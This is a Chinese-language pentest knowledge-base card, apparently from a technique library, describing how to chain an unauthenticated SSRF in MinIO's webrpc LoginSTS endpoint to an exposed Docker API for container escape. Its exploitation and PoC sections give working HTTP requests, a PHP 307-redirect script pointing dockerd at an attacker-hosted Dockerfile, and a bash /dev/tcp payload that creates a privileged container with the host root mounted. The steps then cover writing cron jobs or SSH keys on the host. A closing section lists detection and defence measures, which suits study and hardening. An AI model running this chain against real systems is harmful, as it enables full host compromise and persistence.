---
id: web-generic-ssrf-minio-webrpc-loginsts-docker-build-escape
title: MinIO /minio/webrpc LoginSTS 未授权 SSRF 打内网 Docker API 2375，remote build 加载外部 Dockerfile 逃逸
type: scenario
domain: web
path: web/generic/ssrf
technique: minio-webrpc-ssrf-docker-remote-build
tags:
- minio
- ssrf
- docker
- docker-api
- tcp-2375
- remote-build
- container-escape
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W
  verified_at: '2026-11-08T17:13:23+08:00'
  notes: 已对照原文核对（/minio/webrpc web.LoginSTS、Host 可控、307 Location 指向 127.0.0.1:2375、/build?remote=、Dockerfile 内 bash /dev/tcp 发包一致）；本次核对未读取图片，仅依据正文；未验证 MinIO 受影响版本区间
url: /docs/web/generic/ssrf/web-generic-ssrf-minio-webrpc-loginsts-docker-build-escape/
draft: false
kb_aliases:
- MinIO webrpc SSRF
- web.LoginSTS SSRF
- Docker build remote Dockerfile
- /build?remote= 远程构建
- 容器内 SSRF 打 172.17.0.1:2375
---

## 一句话结论

MinIO 的 `/minio/webrpc` 在 `web.LoginSTS` 等方法里会按请求 `Host` 头拼出后端地址并发起请求，把 `Host` 改成内网 `172.17.0.1:2375`（Docker API）即构成 SSRF；再用 Docker API 的 `/build?remote=<外部 Dockerfile>` 让 dockerd 自己去拉取攻击者构造的 Dockerfile 并 `build`+`run`，Dockerfile 里 `Binds: /:/mnt` 的 `RUN` 阶段就能读写宿主机根目录，完成容器逃逸。

## 原理

- MinIO 的浏览器/STS 相关 web 接口把 `Host` 头当作后端分布式节点地址，未做内网地址校验；攻击者能控制 `Host`，就能让 MinIO 服务端代替自己发起 HTTP 请求（服务端请求伪造）。
- 关键在于 MinIO 会**跟随重定向**：把 `Host` 指向攻击者 HTTP 服务，该服务返回 `307`，MinIO 就会按 `Location` 再发一次请求。选用 `307` 而不是 `302` 是因为 307 保留原方法与原请求体，MinIO 原来的 `POST /minio/webrpc` 于是原样变成 `POST /build?...`。`Location` 写成 `http://127.0.0.1:2375/build?remote=...`，这个 `127.0.0.1` 是在 MinIO 进程的网络命名空间里解析的——即它自己所在宿主机/容器上的 Docker API，从而绕过「攻击者不直接可达 2375」的限制。
- Docker daemon 的 REST API 若在 `2375` 明文端口暴露（同宿主机 `172.17.0.1:2375` 是 docker0 网关，容器网络可直达），任何能发包的进程都能创建容器。这是比「容器内挂载 docker.sock」更隐蔽的路径：容器里没有 socket，但网络可达 API。
- `/containers/create` + `/containers/{id}/start` 组合可创建 `Privileged: true` 且 `Binds: ["/:/mnt"]` 的容器，即宿主机根目录被挂进容器。
- 由于目标容器镜像里可能没有 `curl`/`wget`，原文改用 bash 的 `/dev/tcp` 直接手写 HTTP 报文，只依赖 bash，非常适合「最小镜像」环境。
- `/build?remote=<url>` 是 Docker API 的 `POST /build`，`remote` 参数让 dockerd 主动拉取构建上下文（这里是单个 Dockerfile），因此攻击者不必能在目标上落地文件，只要目标能回连到攻击者的 HTTP/Dockerfile 托管点即可。构建上下文中的 `RUN` 在构建容器里执行，构建容器同样可以带 `Binds`/特权配置（取决于版本与 `HostConfig`），原文即通过在 Dockerfile 内执行脚本，把 `/` 挂载后的宿主机文件读走。

## 触发条件

- MinIO 版本/部署存在 `web.LoginSTS` 等按 `Host` 头转发请求的行为，且可从攻击者位置访问（未授权或已持有任意凭据）。
- 目标容器网络能访问宿主机 Docker API（`172.17.0.1:2375` 明文，或 `host.docker.internal:2375`）。
- Docker API 未启用 TLS 客户端认证。
- 攻击者有可被目标回连的 HTTP 服务（用于托管 Dockerfile 或做 307 跳转）。

## 利用步骤

1. 确认 MinIO SSRF 与重定向跟随：让 `Host` 指向攻击者 HTTP 服务，返回一个 `Location` 指向内网地址的 307 跳转，观察内网响应/回连差异。

```http
POST /minio/webrpc HTTP/1.1
Host: ATTACKER:8081
Content-Type: application/json
Content-Length: 76

{"id":1,"jsonrpc":"2.0","params":{"token":"Test"},"method":"web.LoginSTS"}
```

   攻击者侧 8081 上放一个只做 307 跳转的脚本（原文用 PHP）：

```php
<?php
header('Location: http://127.0.0.1:2375/build?remote=http://ATTACKER/Dockerfile&nocache=true&t=evil:1', false, 307);
```

2. 攻击者侧再放一个 HTTP 服务托管 Dockerfile（`docker build` 的构建上下文）。由于目标镜像里可能没有 `curl`/`wget`，Dockerfile 里的 `RUN` 用 bash 的 `/dev/tcp` 直接手写 HTTP 报文创建挂载宿主机根目录的特权容器：

```bash
exec 3<>/dev/tcp/172.17.0.1/2375
printf '%s\r\n' \
 'POST /containers/create HTTP/1.1' \
 'Host: 172.17.0.1:2375' \
 'Connection: close' \
 'Content-Type: application/json' \
 'Content-Length: 133' \
 '' \
 '{"HostName":"remoteCreate","User":"root","Image":"REGISTRY/public/mysql:5.6","HostConfig":{"Binds":["/:/mnt"],"Privileged":true}}' >&3
```

3. 取响应里的容器 `Id`，再 `POST /containers/<id>/start` 启动。
4. 需要执行命令时 `POST /containers/<id>/exec`，`{"Cmd":["/bin/bash","-c","..."],"AttachStdout":true}` 后 `POST /exec/<exec_id>/start` 取回显；或直接用 remote build 的 Dockerfile 路径完成。
5. remote build 触发请求本身极简，因为 MinIO 会替我们发：

```http
POST /minio/webrpc HTTP/1.1
Host: ATTACKER:8081
Content-Type: application/json
Content-Length: 76

{"id":1,"jsonrpc":"2.0","params":{"token":"Test"},"method":"web.LoginSTS"}
```

   真正落到 Docker API 的是 307 里那条 `POST /build?remote=http://ATTACKER/Dockerfile&nocache=true&t=evil:1`。
6. Dockerfile 内完成提权/读取：`RUN` 中挂载并读取宿主机 `/mnt`、写 `/mnt/etc/cron.d/`、或写 `authorized_keys`。

## PoC

最小 SSRF 验证：`Host` 指向攻击者 HTTP 服务，该服务返回 `Location: http://127.0.0.1:2375/version` 的 307，若 MinIO 侧日志/回连出现第二次请求即证明「Host 可控 + 跟随重定向」成立。

```http
POST /minio/webrpc HTTP/1.1
Host: ATTACKER:8081
Content-Type: application/json
Content-Length: 76

{"id":1,"jsonrpc":"2.0","params":{"token":"Test"},"method":"web.LoginSTS"}
```

跳转落地后即 `GET /version`（Docker API 探活），再换 `POST /build?...`。

## 变体与关联

- 变体：307 换成 308 同样保留方法与请求体；302/303 会把 POST 降级成 GET，打不通 `/build`。
- 变体：若 MinIO 不出网但同宿主机有其它可回连组件，把 `Location` 指向 `127.0.0.1` 的其它内网管理端口同样成立（本卡的 `127.0.0.1:2375` 只是最有价值的一个）。
- 变体：目标不出网时，不要 remote build，改在容器内用 bash `/dev/tcp` 全流程发包（不依赖 curl/wget）。
- 关联：[[cloud-container-docker-socket-tcp-escape]]（直连 2375 或挂载 docker.sock 的等价逃逸结论，本条多出「经 MinIO SSRF 触达」的入口）。
- 关联：[[cloud-container-docker-privileged-host-disk-escape]]（特权容器挂宿主盘的具体逃逸手法）。

## 检测与防御

- 防御：MinIO 前部署反代并把 `Host` 头强制改写为合法值；升级 MinIO 到修复了 STS/浏览器接口 Host 处理的版本。
- 防御：Docker daemon 绝不监听 `0.0.0.0:2375`；如需远程管理，用 TLS 双向认证并限制来源；更彻底是只在宿主本机 unix socket 暴露。
- 防御：容器网络禁止访问 `172.17.0.1:2375`/`host.docker.internal:2375`；用 NetworkPolicy/iptables 拦住 docker0 网关对管理端口的访问。
- 检测：MinIO 日志中出现异常 `Host`（内网 IP:2375 等）；dockerd 出现 `POST /build?remote=`、`POST /containers/create` 且 `Binds` 含 `/`、`Privileged:true`；容器内出现 `exec 3<>/dev/tcp/172.17.0.1/2375` 特征流量。
- 响应：停止并删除异常容器与镜像、清理宿主机 crontab/authorized_keys、轮换 MinIO 与 Registry 凭据。
